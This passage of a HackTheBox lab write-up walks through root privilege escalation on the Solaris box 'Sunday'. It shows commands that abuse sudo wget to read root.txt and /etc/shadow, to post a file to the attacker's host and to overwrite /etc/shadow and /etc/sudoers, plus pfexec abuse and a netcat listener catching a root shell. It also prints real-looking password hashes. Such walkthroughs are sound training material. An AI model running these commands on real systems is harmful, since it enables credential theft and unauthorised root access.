+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">9999</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.46</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.76</span><span class="o">]</span><span class="w"> </span><span class="mi">56164</span><span class="w"></span>
+<span class="n">root</span><span class="nv">@sunday</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">id</span><span class="w"></span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1</span><span class="p">(</span><span class="n">other</span><span class="p">),</span><span class="mi">2</span><span class="p">(</span><span class="n">bin</span><span class="p">),</span><span class="mi">3</span><span class="p">(</span><span class="n">sys</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">),</span><span class="mi">5</span><span class="p">(</span><span class="n">uucp</span><span class="p">),</span><span class="mi">6</span><span class="p">(</span><span class="n">mail</span><span class="p">),</span><span class="mi">7</span><span class="p">(</span><span class="n">tty</span><span class="p">),</span><span class="mi">8</span><span class="p">(</span><span class="n">lp</span><span class="p">),</span><span class="mi">9</span><span class="p">(</span><span class="n">nuucp</span><span class="p">),</span><span class="mi">12</span><span class="p">(</span><span class="n">daemon</span><span class="p">)</span><span class="w"></span>
+</pre></div>
+
+
+<p>Achieving the above was not very easy. It turns out there is a script resetting troll back again to its original state every 5 seconds. I only managed that as I was fast and I got the tip from IPPSEC.</p>
+<h3>2. Read the root.txt with wget options</h3>
+<p>I admit at this stage I was stuck for more than I expected. I am quite sure being a an old Solaris box there will be vulnerabilities to exploit althouth I did not manage to do it and wasted quite some time. However, researching online I found out that we could use the wget command to simply read file by using the <strong><em>--input-file</em></strong> (<strong><em>-i</em></strong>) option. So since sammy can run wget as root we can use it to read any file we want. Let's try to read root.txt</p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ sudo wget -i /root/root.txt</span>
+<span class="err">/root/root.txt: Invalid URL fb????????????????????????????b8: Unsupported scheme</span>
+<span class="err">No URLs found in /root/root.txt.</span>
+</pre></div>
+
+
+<p>Although I get an error because there were no URL found, I am still able to see the content of root.txt. Very simple and effective!</p>
+<p>Another way to read the root.txt file is by using the <strong><em>--post-file</em></strong> option:</p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ sudo wget --post-file=/root/root.txt 10.10.14.46:1234</span>
+<span class="c">--10:20:52--  http://10.10.14.46:1234/</span>
+<span class="c">           =&gt; `index.html&#39;</span>
+<span class="err">Connecting to 10.10.14.46:1234... connected.</span>
+<span class="err">HTTP request sent, awaiting response...</span>
+</pre></div>
+
+
+<p>and on my kali box, where I had opened a netcan session started we can see the hash:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">1234</span><span class="w"></span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">1234</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.46</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.76</span><span class="o">]</span><span class="w"> </span><span class="mi">44131</span><span class="w"></span>
+<span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span><span class="w"></span>
+<span class="k">User</span><span class="o">-</span><span class="nl">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Wget</span><span class="o">/</span><span class="mf">1.10.2</span><span class="w"></span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="cm">/*</span>
+<span class="cm">Host: 10.10.14.46:1234</span>
+<span class="cm">Connection: Keep-Alive</span>
+<span class="cm">Content-Type: application/x-www-form-urlencoded</span>
+<span class="cm">Content-Length: 33</span>
+
+<span class="cm">fb????????????????????????????b8</span>
+</pre></div>
+
+
+<h3>3. Modify the /etc/shadow</h3>
+<p>Using the same concept we can read the /etc/shadow and get the root password hash. Then we can try to crack it as we did previously.</p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ sudo wget -i /etc/shadow </span>
+<span class="err">/etc/shadow: Invalid URL root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL daemon:NP:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL bin:NP:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL sys:NP:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL adm:NP:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL lp:NP:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL uucp:NP:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL nuucp:NP:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL dladm:*LK*:::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL smmsp:NP:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL listen:*LK*:::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL gdm:*LK*:::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL zfssnap:NP:::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL xvm:*LK*:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL mysql:NP:::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL openldap:*LK*:::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL webservd:*LK*:::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL postgres:NP:::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL svctag:*LK*:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL nobody:*LK*:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL noaccess:*LK*:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL nobody4:*LK*:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::: Unsupported scheme</span>
+<span class="err">/etc/shadow: Invalid URL sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::: Unsupported scheme</span>
+<span class="err">No URLs found in /etc/shadow.</span>
+</pre></div>
+
+
+<p>As I did per sammy, similarly  I could apply the same procedure for root to crack the hash but there is a simpler way and less time consuming way. We can simply change the hash of root and replace it with something else, for instance with sammy's hash. Let's try that</p>
+<p>I copy sunday /etc/shadow content on my kali box and I replace the root hash with sammy's as follows:</p>
+<div class="highlight"><pre><span></span><span class="c">root:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:14146::::::</span>
+<span class="c">daemon:NP:6445::::::</span>
+<span class="c">bin:NP:6445::::::</span>
+<span class="c">sys:NP:6445::::::</span>
+<span class="c">adm:NP:6445::::::</span>
+<span class="c">lp:NP:6445::::::</span>
+<span class="c">uucp:NP:6445::::::</span>
+<span class="c">nuucp:NP:6445::::::</span>
+<span class="c">dladm:*LK*:::::::</span>
+<span class="c">smmsp:NP:6445::::::</span>
+<span class="c">listen:*LK*:::::::</span>
+<span class="c">gdm:*LK*:::::::</span>
+<span class="c">zfssnap:NP:::::::</span>
+<span class="c">xvm:*LK*:6445::::::</span>
+<span class="c">mysql:NP:::::::</span>
+<span class="c">openldap:*LK*:::::::</span>
+<span class="c">webservd:*LK*:::::::</span>
+<span class="c">postgres:NP:::::::</span>
+<span class="c">svctag:*LK*:6445::::::</span>
+<span class="c">nobody:*LK*:6445::::::</span>
+<span class="c">noaccess:*LK*:6445::::::</span>
+<span class="c">nobody4:*LK*:6445::::::</span>
+<span class="c">sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::</span>
+<span class="c">sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::</span>
+</pre></div>
+
+
+<p>Then I start an http server with python on my kali box</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/sunday# python -m SimpleHTTPServer</span>
+<span class="err">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</pre></div>
+
+
+<p>and then I use wget to download the file and overwrite the existing /etc/shadow (using the -O option to overwrite it).</p>
+<div class="highlight"><pre><span></span><span class="n">sammy</span><span class="nv">@sunday</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="mf">10.10.14.46</span><span class="err">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">shadow</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span><span class="w"></span>
+<span class="c1">--10:10:20--  http://10.10.14.46:8000/shadow</span>
+<span class="w">           </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">`</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span><span class="s1">&#39;</span>
+<span class="s1">Connecting to 10.10.14.46:8000... connected.</span>
+<span class="s1">HTTP request sent, awaiting response... 200 OK</span>
+<span class="s1">Length: 634 [application/octet-stream]</span>
+
+<span class="s1">100%[==================================================================================================================&gt;] 634           --.--K/s             </span>
+
+<span class="s1">10:10:20 (60.28 MB/s) - `/etc/shadow&#39;</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="o">[</span><span class="n">634/634</span><span class="o">]</span><span class="w"></span>
+</pre></div>
+
+
+<p>then we can switch to the root user providing sammy's password (cooldude!) and we are in!</p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ su -</span>
+<span class="c">Password: </span>
+<span class="err">Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008</span>
+<span class="err">You have new mail.</span>
+<span class="err">root@sunday:~# id</span>
+<span class="err">uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)</span>
+<span class="err">root@sunday:~#</span>
+</pre></div>
+
+
+<h3>4. Modify the /etc/sudoers</h3>
+<p>based on the info we gathered for both sunny and sunday, the sudoers file in the box should contain at least this:</p>
+<div class="highlight"><pre><span></span><span class="err">root  ALL=(ALL) ALL</span>
+<span class="err">sammy ALL=(root) NOPASSWD: /usr/bin/wget</span>
+<span class="err">sunny ALL=(root) NOPASSWD: /root/troll</span>
+</pre></div>
+
+
+<p>so i can tamper this file with the same procedure used on point 2. and have this instead:</p>
+<div class="highlight"><pre><span></span><span class="err">root  ALL=(ALL) ALL</span>
+<span class="err">sammy ALL=(root) NOPASSWD: /usr/bin/su</span>
+<span class="err">sunny ALL=(root) NOPASSWD: /root/troll</span>
+</pre></div>
+
+
+<p>I have replaced wget with <strong>su</strong>. Then I open a simple python http server and download and overwrite the sudoers file with wget</p>
+<div class="highlight"><pre><span></span><span class="n">sammy</span><span class="nv">@sunday</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="mf">10.10.14.46</span><span class="err">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">sudoers</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span><span class="w"></span>
+<span class="c1">--19:07:07--  http://10.10.14.46:8000/sudoers</span>
+<span class="w">           </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">`</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span><span class="s1">&#39;</span>
+<span class="s1">Connecting to 10.10.14.46:8000... connected.</span>
+<span class="s1">HTTP request sent, awaiting response... 200 OK</span>
+<span class="s1">Length: 98 [application/octet-stream]</span>
+
+<span class="s1">100%[==================================================================================================================&gt;] 98            --.--K/s             </span>
+
+<span class="s1">19:07:07 (22.31 MB/s) - `/etc/sudoers&#39;</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="o">[</span><span class="n">98/98</span><span class="o">]</span><span class="w"></span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ sudo -l</span>
+<span class="err">User sammy may run the following commands on this host:</span>
+<span class="err">    (root) NOPASSWD: /usr/bin/su</span>
+</pre></div>
+
+
+<p>Once this is done I can simply  become root as follow:</p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ sudo su</span>
+<span class="err">root@sunday:~# id</span>
+<span class="err">uid=0(root) gid=0(root)</span>
+</pre></div>
+
+
+<h3>5. leveraging pfexec</h3>
+<p>Lastly I found another method which is interesting. I know Linux and I know that Solaris is another unix system hence has a lot of similarities with Linux. However, I didn't know a particular Solaris command, <strong><em>pfexec</em></strong>.</p>
+<p><strong><em>pfexec</em></strong> provides a RBAC (Role Based Access Control) mechanism and is basicaly the passwordless version of sudo. More info are available at <a href="https://docs.oracle.com/cd/E36784_01/html/E36870/pfexec-1.html">the official oracle website</a>. </p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ cat /etc/user_attr                                             </span>
+<span class="err">#                                                                              </span>
+<span class="err"># Copyright 2008 Sun Microsystems, Inc.  All rights reserved.                  </span>
+<span class="err"># Use is subject to license terms.                                             </span>
+<span class="err">#                                                                              </span>
+<span class="err"># CDDL HEADER START                                                            </span>
+<span class="err">#                                                                              </span>
+<span class="err"># The contents of this file are subject to the terms of the                    </span>
+<span class="err"># Common Development and Distribution License (the &quot;License&quot;).                 </span>
+<span class="err"># You may not use this file except in compliance with the License.             </span>
+<span class="err">#                                                                              </span>
+<span class="err"># You can obtain a copy of the license at usr/src/OPENSOLARIS.LICENSE          </span>
+<span class="err"># See the License for the specific language governing permissions              </span>
+<span class="err"># and limitations under the License.                                           </span>
+<span class="err">#                                                                              </span>
+<span class="err"># When distributing Covered Code, include this CDDL HEADER in each   </span>
+<span class="err"># file and include the License file at usr/src/OPENSOLARIS.LICENSE.            </span>
+<span class="err"># If applicable, add the following below this CDDL HEADER, with the            </span>
+<span class="err"># fields enclosed by brackets &quot;[]&quot; replaced with your own identifying          </span>
+<span class="err">#                                                                                                                                                             </span>
+<span class="err"># CDDL HEADER END                                                                                                                                             </span>
+<span class="err">#                                                                                                                                                             </span>
+<span class="err"># /etc/user_attr                                                                                                                                              </span>
+<span class="err">#                                                                                                                                                             </span>
+<span class="err"># user attributes. see user_attr(4)                                                                                                                           </span>
+<span class="err">#                                                                                                                                                             </span>
+<span class="err">#                                                                                                                                                             </span>
+<span class="c">adm::::profiles=Log Management                                                                                                                                </span>
+<span class="c">dladm::::auths=solaris.smf.manage.wpa,solaris.smf.modify                                                                                                      </span>
+<span class="c">lp::::profiles=Printer Management                                                                                                                             </span>
+<span class="c">postgres::::type=role;profiles=Postgres Administration,All                                                                                                    </span>
+<span class="c">root::::type=role;auths=solaris.*,solaris.grant;profiles=All;lock_after_retries=no;min_label=admin_low;clearance=admin_high</span>
+<span class="c">zfssnap::::type=role;auths=solaris.smf.manage.zfs-auto-snapshot;profiles=ZFS File System Management</span>
+<span class="c">sammy::::profiles=Primary Administrator;roles=root</span>
+</pre></div>
+
+
+<p>Looking at the /etc/user_attr file (similar to the sudoers file in linux) we notice that sammy is listed there and has been given root role.</p>
+<p>So we can simply run anything we want using sammy and the pfexec command. For example we can run the following to get root.txt output</p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ pfexec cat /root/root.txt</span>
+<span class="err">fb????????????????????????????b8</span>
+</pre></div>
+
+
+<p>or we can just run the below to get a bash shell as root:</p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ pfexec bash</span>
+<span class="err">sammy@sunday:~# id</span>
+<span class="err">uid=0(root) gid=0(root) groups=10(staff)</span>
+</pre></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
